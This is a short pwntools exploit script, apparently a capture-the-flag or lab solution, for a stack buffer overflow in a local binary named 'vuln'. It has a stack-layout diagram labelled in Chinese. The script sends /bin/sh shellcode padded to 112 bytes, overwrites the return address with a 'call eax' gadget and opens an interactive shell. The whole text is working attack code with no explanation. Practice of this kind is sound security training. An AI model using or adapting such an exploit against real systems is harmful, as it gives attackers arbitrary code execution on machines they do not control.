from pwn import *

"""
高地址
----
CALL_EAX
---- <- RET
AAAA
---- <- EBP
AAAA
----
...
----
shellcode
---- <- BUFFER
低地址
"""

elf = context.binary = ELF('./vuln')
p = process()

CALL_EAX = 0x08049019

payload = asm(shellcraft.sh())   
payload = payload.ljust(112, b'A')
payload += p32(CALL_EAX)

p.sendline(payload)
p.interactive()
